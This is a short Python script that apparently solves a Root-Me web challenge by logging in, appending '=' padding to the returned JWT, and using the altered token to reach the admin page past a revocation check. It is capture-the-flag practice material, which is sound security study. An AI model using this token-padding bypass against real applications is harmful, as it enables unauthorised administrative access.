import requests

url = "http://challenge01.root-me.org/web-serveur/ch63/"
payload = {
    "username": "admin",
    "password": "admin"
}
response = requests.post(url=(url + "login"), json=payload).json()
access_token = response["access_token"] + "="

headers = {"Authorization": f"Bearer {access_token}"}
response = requests.get(url=(url + "admin"), headers=headers)
if "Token is revoked" in response.text:
    print("Token is revoked, cannot access admin page.")
else:
    print(response.text)

